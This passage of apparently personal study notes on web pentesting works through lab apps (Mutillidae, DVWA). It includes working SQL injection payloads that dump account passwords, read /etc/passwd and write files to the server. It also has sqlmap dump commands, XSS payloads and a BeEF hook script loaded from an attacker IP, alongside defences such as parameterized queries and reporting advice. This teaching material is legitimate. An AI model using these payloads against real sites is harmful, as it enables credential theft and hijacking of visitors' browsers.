* Normally we use select to select the cols, but since we are using multiple selects and using a URL we do union select
 
          union select 1, 2, 3, 4, 5
* The output of the above in our case shows that only col 2, 3, 4 are visible.
* Now to see our database

           union select 1, database(), user(), version(), 5
* We get the database name as 'owasp10', which is the database of mutillidae.
* Now to discover the tables in our database (information_schema is a default database created by mysql and it contains info about all other databases)

           union select 1, table_name, null, null, 5 from information_schema.tables where table_schema = 'owasp10'
* Now we are going to get the columns of 'accounts' table

           union select 1, column_name, null, null, 5 from information_schema.columns where table_name = 'accounts'
* We get the columns - cid, username, password, mysignature, is_admin
* Now let's get the usernames and passwords

           union select 1, username, password, is_admin, 5 from accounts
           
### Reading and Writing files on the server using SQLI vuln
* To read (the file is same as we used for previous read write vulnerability)

          union select null, load_file('/etc/passwd'), null, null, null 
* To write into server

          union select null, 'example example', null, null, null  into outfile '/var/www/mutillidae/example.txt'
* So we are ging to write 'example example' into a new file called example.txt

### Doing SQLI using a tool = SQLMAP
* Tool designed to exploit sql injections
* Works with many db types - mysql, mssql,etc
* Can be used to perform everything we learned and more

To run it
* We have to have the target url ( url of login page)

          sqlmap "target_url"
* Now tool automatically look through if anything is injectable
* To get all database

          sqlmap "target_url" --dbs
* To get current user

          sqlmap "target_url" --current-user
* To get current database

          sqlmap "target_url" --current_database
* To get tables of our database (owasp10)

          sqlmap "target_url" --tables -D owasp10
* For columns of 'accounts' table

          sqlmap "target_url" --columns -T accounts -D owasp10
* For data of 'accounts' table

          sqlmap "target_url" -T accounts -D owasp10 --dump
         
## Preventing SQL INJECTION
* Filters can be used, but they can be bypassed
* Use black list of commands? stille can be bypassed
* Use whitelist? same issue

Solution
* Use parameterized statements, seperate data from sql code
* eg:-
   
       <?php
       $textbox1 = admin' union select #
       Select * from accounts where username='$textbox1'

       Safe:
       ->prepare("Select * from accounts where username =?")
       ->execute(array('$textbox1')
       
       ?>
* Also allow the users least privileges as possible

## Website hacking - Cross Site Scripting Vulns (XSS)
* It allows an attacker to inject js code into the page
* Code is executed when the page loads
* Code is executed on the client machine not the server

Three main types
1. Persistent/Stored XSS
   * The code that we inject will be stored into the database, so that anytime any user view that page, our code will be executed.
2. Reflected XSS
   * The code will be executed only when the target user runs a specific URL written by us
3. DOM based XSS
   * It results from js code written on the client. So, the code will be interpreted and run on the client side without having any communication with the web server
   * This can be very dangerous, bcz sometimes server applies security and filteration to check for XSS, but in this case, this service won't be available to the client

### Dicovering XSS
Done very similar to SQLI
* Try  to inject js code into the  pages
* Test this in text boxes and url parameters on the form
  http://target.com/page.php?something=something

### REFLCTED XSS
* No persistent, not stored
* Only work if the target visits a specially crafted URL
* EX
  http://target.com/page.php?something=<script>alert("XSS")</script>
* Go to 'XSS Reflected' in DVWA page of metasploitable.
* In 'what's your name' we can inject '<script>alert("XSS")</script>'.
* This will generate a URL
* Now we have sent this URL to the target client=, and when they open it, the code will be executed

### STORED XSS
* Persistent, stored on the page or DB
* The injected code is executed everytime the page is loaded
* An example is reviews. When someone reviews, it will be visible to everyone
* Go to 'XSS stored' in DVWA
* Inject the code in 'message' text box
* Now whenever any user opens this page, this code will be executed

### Exploiting XSS Hooking Vulnerable Page Visitors To BeEF
* Run any JS code
* Beef framework can be used to hook targets
* Inject Beef hook in vulnerable pages
* Execute code from beef

* Start beef in kali
* Go to 'XSS stored' in DVWA
* Inject <script src='http://Our_IP:3000/hook.js></script> in 'message' field, and give any name
* When the target opens this page, they will be hooked

### Preventing XSS Vulns
* Minimize the usage of user input on html.
* Escape any input before inserting it into the page, so that if it is a code, it will never be executed.

## Website Hacking Discovering Vulnerabilities Automatically
* Automatically find vulnerabilities in web apps
* Free and easy to use
* Can also be used for manual testing
* We are going to use ZAP
* Open it and paste the URL we want to crack
* Now the scan result will appear. Alerts is where the vulnerabilities found will be shown. 'Red flags' are the high rissk vulns
* If we right click ob the vuln and choose Open it in browser, it will exploit it for us.

## Pentest Methodology for website hacking
* Info gathering
* For every domain/subdomain
   * Click on every link
      * For every link:
          * Test parameters. Test the data sent in the URL after the  =  sign
* Some websites won't have  =  in their URL. So, we won't be able to see the data that is being sent through URL, it is more hidden. We can see the data and manipulate it using a proxy called Burp Suite.

## PENTEST REPORTS
At the end of a pentest, we will need to inform the client with all the vulnerabilities in a pentest report
* A document that includes all of our findings
* It detail our findings to the client
* Good reports are detailed but are also easy to understand
* Each company has their own templates/standards

An example for a pentest is Sample-Pentest-Report : file.
* It contains an Executive summary with summary of the tests for less technical people
* Engagement Survey is also for less technical people
* Technical Details cintains all the technical details

# Ways to secure website apps
No website can be 100% safe. We can only try to improve the security. The 4 approaches to secure are:
1. Secure Code : To make sure we are writing secure code
   * Advantages
       * Very thorough
   * Disadvantages
       * Developers need to be educated about the methods hackers use
       * A lot of the time, developers rely on 3rd party libraries, whose security is not in our hands
2. Code Review : To get our code reviewed by other developers or other team.
   * Advantages
       * Very thorough
   * Disadvantages
       * If the code size is large, it will be time consuming and expensive
3. Pen Testing : We hire a team of ethical hackers to try and hack our application
   * Advantages
       * Covers more attack surfaces
   * Disadvantages
       * Not future proof
       * Expensive
4.  Bug Bounty : An invitation to all ethical hackers around the world to test our application and give them bounty if any vulnerabilities are found
   * Advantages
       * Lots of testers - more likely to find more bugs
       * Future proof
   * Disadvantages
       * Cannot guarantee full coverage (all attack surfaces)
       * Hard to manage
